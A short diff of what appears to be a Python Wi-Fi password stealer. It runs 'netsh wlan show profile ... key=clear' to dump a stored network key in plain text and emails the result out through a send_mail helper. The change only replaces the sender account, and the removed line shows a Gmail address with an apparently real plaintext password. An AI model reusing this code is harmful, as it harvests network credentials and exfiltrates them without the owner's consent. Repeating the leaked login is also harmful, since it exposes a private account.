@@ -11,4 +11,4 @@ def send_mail(email, password ,message):
 
 command = "netsh wlan show profile UPC723762 key=clear"
 result = subprocess.check_output(command, shell=True)
-send_mail("amarjeetkhasyap@gmail.com","9540@2479#80$",result)
+send_mail("amarjeet@gmail.com","*********",result)
